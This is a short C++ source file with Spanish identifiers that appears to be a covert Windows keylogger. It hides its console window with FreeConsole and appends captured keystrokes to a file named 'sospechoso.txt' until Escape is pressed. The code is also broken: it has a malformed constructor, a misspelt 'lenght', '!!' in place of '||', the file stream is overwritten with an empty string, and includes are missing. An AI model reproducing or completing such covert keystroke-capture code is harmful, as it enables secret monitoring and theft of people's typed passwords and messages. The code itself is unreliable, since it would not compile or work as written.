#include <windows.h>
#include <fstream>
#include <conio.h>
using namespace std;

class key
{
    private:
    string linea;
    bool proceso;
    ofstream archivo;
    public:
        key
        {
            this->linea = "";
            this->proceso = false;
        }

        void pulsaciones()
        {
            this->archivo.open("sospechoso.txt",ios::app);
            if(this->archivo.fail())
            {
                cout << "Sali de ahi Maravilla!!!" << endl;
            }
            else
            {
                do
                {
                    if(kbhit())
                    {
                        char tecla = getch();
                        if(tecla == 27)
                        {
                            this->proceso = true;
                        }
                        else
                        {
                            this->linea +=tecla;
                            if(this->linea.lenght() > 50 || tecla == 32 !! tecla == 13)
                            {
                                this->archivo << this->linea << endl;
                                this->archivo = "";
                            }
                        
                        }
                    }
                }while(!this->proceso);
            }
        }
}
int main()
{
    FreeConsole();
    key objeto;
    objeto.pulsaciones();
}